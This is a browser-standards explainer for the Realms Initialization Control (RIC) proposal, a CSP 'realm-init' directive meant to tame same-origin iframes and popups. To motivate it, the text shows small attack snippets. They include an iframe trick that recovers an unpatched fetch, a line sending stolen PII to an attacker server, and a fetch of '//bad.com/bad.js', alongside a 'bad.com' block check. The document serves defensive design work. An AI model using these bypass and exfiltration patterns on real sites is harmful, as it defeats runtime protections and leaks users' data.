# RIC Proposal (Explainer)

> _**R**ealms **I**nitialization **C**ontrol proposal (to introduce **security controls** to [same origin realms](#Same-Origin-Realm) in web applications)_

The proposal for **R**ealms **I**nitialization **C**ontrol (referred to as **RIC**) allows developers to securely tap into the creation moment of [same origin realms](#Same-Origin-Realm) within their web application in order to tame and control them.

While from a **usability** point of view this is already natively provided by the platform by using `load` events of iframes for example:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://example.com/';
iframe.style.display = 'none';
iframe.onload = () => iframe.style.display = 'block';
document.body.appendChild(iframe);
```

**RIC** attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly differently, because of how they can be manipulated against security mechanisms the app might wish to dictate.

> _Authored by [Gal Weizman](https://github.com/weizman) , [Zbigniew Tenerowicz
](https://github.com/naugtur) ([participate here](https://github.com/weizman/Realms-Initialization-Control-API/issues))_

## Status

> _Stage: Incubated (WICG)_

* [Chrome Status](https://chromestatus.com/feature/5080729822953472)
* [Intent to Prototype](https://groups.google.com/a/chromium.org/g/blink-dev/c/-mdLv7f_ZN4/)
* [TAG Design Review](https://github.com/w3ctag/design-reviews/issues/985)
* [Webkit Signal](https://github.com/WebKit/standards-positions/issues/389)
* [Mozilla Signal](https://github.com/mozilla/standards-positions/issues/1062)

## Table of contents

* [Abstract](#Abstract)
* [Motivation](#Motivation)
    * [Prior art](#Prior-art)
    * [Limitations](#Limitations)
* [Goals](#Goals)
* [Proposal](#Proposal)
* [Example](#Example)
* [Use Cases](#Use-Cases)
    * [Safe composability](#safe-composability-sandboxing--confinement)
    * [Application Monitoring](#application-monitoring-security--errors--performance--ux)
* [Value](#Value)
    * [User Experience](#User-Experience)
    * [Improved Composability](#Improved-Composability)
* [Discussion](#Discussion)
    * [Feasibility and implementation](#Feasibility-and-implementation)
    * [Canonicality](#Canonicality)
    * [Multiple CSP policies](#Multiple-CSP-policies)
    * [`X-frames` and `frame-src`](#X-frames-and-frame-src)
    * [ShadowRealms](#ShadowRealms)
* [Considerations](#Considerations)
    * [Privacy](#Privacy)
    * [Security](#Security)
* [Self-Review Questionnaire: Security and Privacy](#self-review-questionnaire-security-and-privacy)
* [Terminology](#Terminology)
* [Resources](#Resources)

## Abstract

The evolution of how web applications are being composed is moving towards leaning on code written by other parties more. 

While great in terms of productivity, integration of code that applications do not know nor control naturally introduces security risks.  
No matter how great JavaScript is for easily composing software out of smaller blocks of software, not being able to do so securely will hinder this positive trend.  

To safely scale software composability, application developers must be able to [virtualize](#Virtualization-(in-JavaScript)) web environments at runtime to harden their security and prevent unauthorized entities from accessing [capabilities](#Capabilities) they should not have access to. 

While software providing various runtime protections focused on addressing this matter exists, its security is easily undermined by limited control over manipulating realms.  

This lack of control is also referred to as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf) which is what this proposal focuses on addressing.
It refers to how [same origin realms](#Same-Origin-Realm) leak powerful [capabilities](#Capabilities) to unauthorized entities at runtime in a fundamentally uncontrollable way.  

Introducing a new CSP directive that sets a script to run at the start of each new realm in the application's origin would solve this by allowing web applications to capture same origin realms when initialized to customize them into mitigating the risk they expose the app to.

## Motivation

The problem with [same origin realms](#Same-Origin-Realm) (also known as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf)) is not obvious because it comes into play only in the security and containment context, such as when trying to harness the power of [virtualization in JavaScript](#Virtualization-(in-JavaScript)) for enhanced security at runtime. Therefore, it requires explanation.

The web is a great platform for creating composable software, but not to do so securely - the environment and the APIs available make it extremely difficult for applications to contain a program without having to trust it, especially when interacting with the DOM.

Unfortunately, securing a supply chain - telling good code from bad code within the dependencies from which an application is composed - is very hard. 
This is evident by the prevalence of services focused on detecting threats both before they get baked into an application (at build-time) and while being executed on the fly (at runtime).

One way to approach this problem at runtime is by [virtualization](#Virtualization-(in-JavaScript)) - redefining JavaScript [capabilities](#Capabilities) (commonly known as [monkey patching](https://en.wikipedia.org/wiki/Monkey_patch)) to behave similarly while hardening them to limit how they can be used.

However, due to some characteristics of how the web is designed, there are some major blockers in fully unleashing the power of virtualization in favor of introducing runtime security.

One of those blockers is the lack of control web applications have over safe introduction of same origin realms into their execution environment at runtime.

Any capability limited by a security tool in the current realm of the application:

```javascript
/* security tool mitigating access to powerful capabilities */

function mitigate(realm) {
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            throw new Error('Access to powerful capability "fetch" is forbidden')
        }
    })
}

mitigate(window)
```

can be easily obtained as a fresh new instance from a fresh new realm:

```javascript
/* attacker bypassing mitigation by leveraging the same origin concern */ 

function stealFetch() {
    try {
        return window.fetch
    } catch (err) { // Uncaught Error: Access to powerful capability "fetch" is forbidden
        const ifr = document.createElement('iframe')
        const realm = document.body.appendChild(ifr).contentWindow
        return realm.fetch
    }
}

// function fetch() { [native code] }
const newFetchInstance = stealFetch()
```

The motivation behind this proposal is to remove this blocker by providing developers a way to control the initialization of same origin realms to tame access to powerful capabilities those leak.   

### Prior art

We have been working on a virtualized solution called [Snow JS ❄️](https://github.com/lavamoat/snow) to allow applying security mechanisms to same origin realms automatically.
Snow expects a callback, which it'll fire immediately with every new realm that comes to life within the same origin of the application.

In the context of the former example, this allows security tools to not worry about the same origin concern, and thus continue to focus on building their security mechanisms instead.

So by asking Snow to execute the mitigation logic from earlier:

```javascript
/* security tool same protection mechanism, but this time with Snow */

SNOW(realm => mitigate(realm))
```

Snow makes sure to detect same origin realms creation, and by tapping into them, to also run the logic on them immediately and thus to easily cancel the impact of the same origin concern: 

```javascript
/* attacker same bypass won't work this time */ 

// Uncaught Error: Access to powerful capability "fetch" is forbidden
const newFetchInstance = stealFetch()
```

### Limitations

Unfortunately, implementing a user-land solution comes with some fundamental flaws:

#### Scalability

There are too many ways to create same origin realms, and the list keeps on growing as the web evolves. Constantly chasing all the different ways of forming a new realm and attempting to patch them doesn't scale. 

#### Hermeticity

Some of those ways are unaddressable in user-land. Building a bulletproof virtualized solution seems to be impossible.

Race condition in iframe initialization is one example of this - successfully reaching capabilities from a new realm is possible before its `load` event is emitted and reliably determining the earliest moment it becomes available is not feasible:

![Screenshot 2024-03-03 at 11 06 18](https://github.com/weizman/Realms-Initialization-Control-API/assets/13243797/5fd96798-2442-4b6e-9be8-391ecca042f1)

#### More

Other downsides such as performance, compatibility and continuous resilience of such a solution are more important reasons for why achieving this in the user land is far from ideal.

## Goals

* Give web applications control over all realms that fall under their origin - regardless of the APIs used to create the new realm and edge-cases like `about:blank`.
* Make the control opt-in to avoid breaking the web.

The browser is already capable of enforcing rules on new realms before they become reachable, and it is where the same origin concern should also be addressed.

## Proposal

Initialization of same origin realms in an application should be under that application's control.

This proposal describes an opt-in capability to set a script to be loaded first, everytime a same origin realm with synchronous access to the main execution environment of the application is created.

The location of the script can be relative or absolute. Secure connection is required.
The proposed method for setting the script is a Content Security Policy directive as follows:

```
Content-Security-Policy: "realm-init: /scripts/on-new-same-origin-realm.js"
```

## Example

> _This is a simplified demonstration of the proposal - skip over for real world [Use Cases](#Use-Cases)_ 

Prevent network requests revealing Personally Identifiable Information (the feasibility of `containsPII`/`stealPII` is irrelevant to the example as it serves only to illustrate this example).

* `index.html`

```html
Content-Type: text/html
Content-Security-Policy: default-src 'self'; connect-src *; realm-init: /scripts/monitor.js

<html>
  <title> Ticket King - Checkout </title>
  <head>
...
```

* `/scripts/monitor.js`

```javascript
/* monitor.js - redefine fetch API to block leakage of PII data */

function mitigate(realm) {
    const realFetch = window.fetch
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            if (containsPII(resource, options)) {
                throw new Error(`fetch "${resource}" is blocked for containing sensitive PII!`)
            }
            return realFetch.call(this, resource, options)
        }
    })
}

mitigate(window)
```

As a result of the CSP directive pointing to `monitor.js`, the security logic introduced by it will be applied to all same origin realms that can be manipulated against the execution environment of the application (as opposed to allowing scripts to create a new realm and use its clean copy of fetch).

Making the following bypass no longer viable:

```js
const newFetchInstance = stealFetch()
const payload = stealPII()
newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
```

## Use Cases

Here are some use cases introduced by the community which led to the composition of this proposal.

### Safe composability (sandboxing / confinement)

The ability to safely embed untrusted code in a safe way is important for composability. Platforms can use it to allow their users as well as third party providers to enhance their provided functionality, and provide value to end users.

While the web platform allows such safe embedding through cross-origin iframes or workers, there are cases where same-origin untrusted-code embedding is required. E.g., in cases where the untrusted code may not be custom tailored to a sandboxed environment.
In such cases, in order to guarantee the end user's security, platforms will constrain the capabilities that are available to the untrusted code by overriding native prototypes.

At the same time, it's hard to ensure that the overriding scripts are first to run in the embedded contexts, and determined attackers can use that to escape the sandbox under certain conditions. See the same origin concern for more details on that.

This proposal aims to solve this, by enabling the top-level document to guarantee running an initial script in every new same-origin realm, and prevent races that allow for sandbox escapes.

### Application Monitoring (security / errors / performance / ux)

Many application monitoring services rely on overriding ("monkey patching") Javascript and DOM APIs in order to know and control when and how they are called.

This is done to measure these API's performance or to use those API calls to inform other performance measurements, detect runtime errors, or to inspect how apps are being used in order to enhance their UX.

In other cases, the same methods are used to apply runtime security. The security aspect is particularly sensitive to the timing in which the API override happens.

While missed overrides are not-ideal for other use cases, when used for security enforcement, attackers can leverage such ungoverned same origin realms to escape applied runtime security.

To stress this even more, virtualizing the behaviour of JavaScript APIs to monitor/mitigate/block what malicious JavaScript code can do, such as by redefining the behaviour of `fetch`:

```javascript
const realFetch = window.fetch;
window.fetch = function(url, ...args) {
   if (url.includes('bad.com')) {
      throw new Error('BLOCKED');
   }
   return realFetch(url, ...args);
}
```

is effectively meaningless as long as attackers can bypass this by escaping into ungoverned same origin realms (which this proposal aims to address):

```javascript
document.body.appendChild(document.createElement('iframe')).contentWindow.fetch('//bad.com/bad.js');
```

The conclusion is that not being able to enforce such services at a very specific time (earlier than all other scripts) to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have, which attackers can abuse.

## Value

While this feature is developers facing, the value it aspires to introduce is for the end users really, because until this proposal lands, the same origin concern prevents developers from building safe composable web applications within their own origin and instead place untrusted code within cross origin realms which affects the end user in 2 major ways:

### User Experience

The feature aims to enable developers to provide better user experiences when embedding untrusted code into their applications.

Currently when embedding untrusted code, developers are using cross-origin iframes or workers for that purpose, which often creates separate experiences from their own content.

While developers can restrict their own documents (by overriding various JS functions and DOM APIs), attackers can use same-origin realms to regain access to these prototypes.

This proposal enables developers to prevent attackers from regaining access to native prototypes, and hence embed untrusted code into their documents in a safe way. This provides users with richer and more coherent embedded experiences on the web.

### Improved Composability

Not only this will allow to do things apps do today better, but this will also allow developers to introduce composability capabilities that aren't currently possible.

Not being able to secure the origin of the app against untrusted code really limits developers to inferior solutions that require making use of cross origin realms, which effectively limits how far the power of composability can really go.
Allowing such untrusted code to run in the origin of the app can allow it for example to freely interact with the DOM of the app, which isn't possible when embedded in a cross origin document, and when combined with this proposal, such interaction can be mitigated by the hosting app in a finally secure way. Since this example can be easily extended to many other use cases, it might become clear how such a proposal can unlock new power for web apps in the realm of secure composability and embedding of untrusted code.

## Discussion

### Feasibility and implementation

The proposed mechanism mostly relies on functionality already present elsewhere in the browser.

* Running the pre-defined script on each realm initialization already exists in browser extensions as `"run_at": "document_start"` for content scripts.
* Setting the script is being done via CSP, which is an excellent mechanism for canonically enforcing rules to a certain origin.
* Supplying a script path the browser would remember across page loads exists in service worker implementation.

### Canonicality

The browser will load the script defined by the new CSP directive of the top main realm for each new child realm.

Meaning, the top main realm is the only realm in a webpage with the power to set the new CSP directive, and it must trickle down to child realms from the same origin, as they don't have the power to set this directive.

This already goes with how CSP is currently enforcing its rules canonically in the lifetime of a webpage. 

### Multiple CSP policies

According to the [W3C CSP spec (enforcing-multiple-policies)](https://www.w3.org/TR/CSP2/#enforcing-multiple-policies), the browser must have a consistent mechanizm for handling multiple CSPs (e.g. 2 setting headers).

Regarding this proposal, since the proposed directive is designed to support an unlimited amount of remote script resources to be loaded chronologically, the natural way to address this would be to accumulate resources into a chronological list.

So:
```
Content-Security-Policy: realm-init /x.js
Content-Security-Policy: realm-init /y.js
```

Will fuse into:

```
Content-Security-Policy: realm-init /x.js /y.js
```

And will execute the scripts in that order.

### `X-frames` and `frame-src`

`X-frames` and `frame-src` allow controlling what is allowed to be loaded into an `iframe`. Regardless of their use to deny loading content in iframes, ways to crete new same origin realms remain available, such as creating an `about:blank` iframe, opening a new tab using `open` API and more.

### [ShadowRealms](https://github.com/tc39/proposal-shadowrealm/)

While both proposals address realms related concerns, the needs ShadowRealms and the RIC proposal answer are almost completely non-overlapping.

According to the proposal, a ShadowRealm won't be considered a security feature due to how its design leaves it somewhat vulnerable to both [availability](https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md#%EF%B8%8F-availability-protection) and [confidentiality](https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md#%EF%B8%8F-confidentiality-protection) security aspects.

That being said, it also claims that when focusing on the [integrity](https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md#-integrity) aspect of security, a ShadowRealm can be very useful given how it'll hermetically confine any evaluated code within it from escaping to the hosting realm in any way, thus unable to modify its environment and therefore remains incapable of lowering its level of integrity.

This means that using ShadowRealms to host untrusted code will be quite useful for when it can be evaluated within a new type of inescapable same origin realm to preserve the integrity of the hosting environment.

While this can potentially answer many important [use cases](https://github.com/tc39/proposal-shadowrealm/blob/main/explainer.md#use-cases), this means ShadowRealm is irrelevant for preserving the integrity of the hosting environment against untrusted code that requires to run in the same context as the hosting environment.

Meaning, code we don't trust that must run in the top realm of the app cannot be moved and confined within a different realm, even if it shares an agent, including a ShadowRealm.

The two proposals overlap in their will to introduce better ways to preserve the integrity of programs, the difference is that ShadowRealm provides this by running code that might harm the integrity away from the hosting environment, while RIC allows to tame the capabilities provided by the host environment for code that must share space with the hosting realm (visit [use cases](https://github.com/WICG/Realms-Initialization-Control#Use-Cases) for examples).

The so called "taming of capabilities" must extend beyond the main realm environment onto legacy same origin realms (such as iframes and popups) due to the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf), which is the most significant part the RIC proposal aims to solve that no other existing web feature does.

## Considerations

This section focuses on providing important notes to consider in aspects of privacy and security, which should be later on taken into account when integrating this proposal into the relevant specs, as well as when implementing by browsers vendors.

### Privacy

This feature doesn't provide any information about the user, and hence doesn't have privacy aspects to consider.

### Security

Here are some security risks to take into consideration when following this spec for implementation purposes:

#### Universal XSS

Since this proposal focuses on the thin line between same and cross origins, it may put SOP in danger if not implemented correctly.

This proposal enables any top-level document to execute remote scripts in same-origin realms.

If implementations somehow enable that execution to happen in cross-origin realms, that can enable cross-origin scripting in those realms.

Since such scenrio is the result of a browser level mistake, running cross-origin scripts like that can be abused by attackers against any origin they choose, making this a far more dangerous version of XSS known as Universal XSS.

Therefore it's important for implementations to get that part right, and for tests to throughly cover that possibility (this is similar to other powerful features that heavily rely on the same-origin policy, such as Service Workers).

#### Escalation to Code Execution

From the perspective of an attacker, this proposal can also be thought of as a way to escalate a CSP directive set power to full code execution, because if the attacker doesn't find a way to introduce an XSS to the web app, but can somehow control parts of the response's headers, they can translate such capability to an effective XSS using this proposal, by simply configuring a CSP header with the proposed `init-realm` directive pointing to a remote script they control.

In this proposal's current form, this in fact is more than just a security consideration, but perhaps an introduction of an unprecedented security concern, where being able to modify headers can result in XSS (which is possible today only via chaining such ability with other security issues in a vulnerable web app).

In that context, it might be worth reflecting possible alternatives and their pros and cons:

1. CSP (via header) - introduce `init-realm` via a CSP header (current proposal's state)
   * PRO - a capability preserved to the web app (which is the entity expected to be capable of controling such power)
   * CON - if the web app mistakenly allows other entities to control headers, this feature can allow them to introduce XSS (unprecedented)
2. CSP (via meta) - introduce `init-realm` via a meta tag
   * PRO - Better than a header in the sense that transitioning from a headers' setting capability to XSS is unprecedented and quite an escalation, but if attackers need to be able to modify the initial HTML of the app to transition to XSS, that is (1) more unlikely and (2) less of an escalation (if they can inject HTML tags, they might as well inject a script or an iframe).
   * CON - Even if mitigated, still potentially an escalation, for example if attacker can introduce HTML tags but is blocked from getting them to execute thanks to a strict `script-src` implementation, providing a meta tag with `init-realm` can help them escalate to XSS).
3. API (via JavaScript) - instead of CSP, export a JavaScript API that registeres the script to run within all realms (e.g. `window.onRealmInit('/scripts/init-realm.js')`)
   * PRO - This mitigates possibilities for escalations towards code execution, because in order to abuse this feature the attacker must have code execution abilities to begin with
   * CON - Potentially allows all scripts in the page to register their own script (although probably not an issue for 1st party scripts, as long as order of registration is respected, but perhaps sensitive with 3rd party scripts?)
   * NOTE - Perhaps in a similar manner to `navigator.serviceWorker.register`?

#### Integrity of Execution Order

When implementing this proposal, it is crucial to correctly instruct the browser to make sure the script provided via the `init-realm` CSP directive is the first JavaScript code to run within the realm, as in before any scripts dictated to run by its associated document (and to repeat that to all nested same origin realms).

Otherwise, a malicious entity can find a way to introduce their own JavaScript code to run before the `init-realm` script, which would count as a complete bypass of this feature effectively which would miss the goal entirely.

## [Self-Review Questionnaire: Security and Privacy](https://w3ctag.github.io/security-questionnaire/)

> 01.  What information does this feature expose, and for what purposes?

This feature allows a website to register JavaScript code to be executed within new realms that fall under its jurisdiction (same origin) before any other JavaScript code gets to run within them.
Thus, the information it naturally exposes is regarding when a new same origin realm is introudced under the execution environment of the top realm of the website.

> 02.  Do features in your specification expose the minimum amount of information necessary to implement the intended functionality?

Yes, I believe so - no further information is being provided to the website other than what's described under Q#1

> 03.  Do the features in your specification expose personal information, personally-identifiable information (PII), or information derived from either?

No

> 04.  How do the features in your specification deal with sensitive information?

They have nothing to do with such information

> 05.  Does data exposed by your specification carry related but distinct information that may not be obvious to users?

The only distinct information that's being provided to the user that was not possible before is when same origin realms are introduced into the website's execution environment

> 06.  Do the features in your specification introduce state that persists across browsing sessions?

No

> 07.  Do the features in your specification expose information about the underlying platform to origins?

No

> 08.  Does this specification allow an origin to send data to the underlying platform?

No

> 09.  Do features in this specification enable access to device sensors?

No

> 10.  Do features in this specification enable new script execution/loading mechanisms?

Yes, this feature focuses on allowing a website to register JavaScript code to be loaded within new realms when are introduced into the execution environment of the website at runtime.
While the browser somewhat knows already how to load JavaScript code within new realms with features such as web extensions' `content_script:run_at`, granting such power to websites (rather than extensions) is necessarily new.

> 11.  Do features in this specification allow an origin to access other devices?

No

> 12.  Do features in this specification allow an origin some measure of control over a user agent's native UI?

No

> 13.  What temporary identifiers do the features in this specification create or expose to the web?

None

> 14.  How does this specification distinguish between behavior in first-party and third-party contexts?

This feature enables sites to run a remote JavaScript file in the context of new same-origin realms, and only such realms. As same-origin is stricter than same-site, the distinction between first-party and third-party contexts falls out of that restriction.

> 15.  How do the features in this specification work in the context of a browser’s Private Browsing or Incognito mode?

Behaves the same in both modes

> 16.  Does this specification have both "Security Considerations" and "Privacy Considerations" sections?

Both sections can be found under the [Considerations](#Considerations) section in this document, which will later be integrated into the proposed spec as well.

> 17.  Do features in your specification enable origins to downgrade default security protections?

No

> 18.  What happens when a document that uses your feature is kept alive in BFCache (instead of getting destroyed) after navigation, and potentially gets reused on future navigations back to the document?

N/a

> 19.  What happens when a document that uses your feature gets disconnected?

My feature takes place (start to finish) synchronously when the document is introduced to the environment, meaning that if disconnection takes place, it does so after my feature is done necessarily.

> 20.  Does your feature allow sites to learn about the users use of assistive technology?

No

> 21.  What should this questionnaire have asked?

Nothing that comes to mind atm

## Terminology

### Capabilities

APIs provided by the JavaScript and/or browser execution environment (e.g. `Array`, `Object`, `fetch`, `document`, etc).

### Virtualization (in JavaScript)

Virtualization is an abstract concept that could mean many things depends on the context. In the context of JavaScript, this refers to the action of redefining builtin [capabilities](#Capabilities) in the language in order to introduce more logic into them and enhance their value.

### Realm

The technical terminology for the execution environment provided in JavaScript along with a distinct set of [capabilities](#Capabilities) mostly reachable by a representing global object. In the browser environment, the global object is accessible via `window`. Realms can be formed in various ways in the browser ecosystem, most commonly by creating `iframe`s, opening tabs or popup windows using `open` API, using `Worker`s and more. Each of those have its own set of [capabilities](#Capabilities), its own execution environment and its own global object - its own realm ([learn more](https://weizmangal.com/2022/10/28/what-is-a-realm-in-js/)).

### Same Origin Realm

In the browser ecosystem, [realms](#Realm) are associated with an origin. For example, when loading `https://facebook.com/` into the browser, the app loads into a new [realm](#Realm) that is associated with the `facebook.com` origin. Additionally, at any point the app can decide to initialize a child [realm](#Realm), and that [realm](#Realm) can also be associated with an origin. For example, if the `https://facebook.com/` app attaches into its DOM an iframe directed at `https://facebook.com/iframe-page.html`, it'll trigger the creation of a second [realm](#Realm) living within the app at runtime. And since its origin is also `facebook.com`, the two [realms](#Realm) have the same origin - hence the name.

### Cross Origin Realm

The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross-origin realm to realm B, and vice versa.

## Resources

* Further reading on realms security - https://github.com/weizman/awesome-javascript-realms-security
* "The Same Origin Concern" - https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf
* "JavaScript realms used to bypass and eliminate web apps security tools - A problem with a WIP solution" (presented to W3C) - https://www.w3.org/2023/03/secure-the-web-forward/talks/realms.html
* Snow JS ❄️ - https://github.com/lavamoat/snow
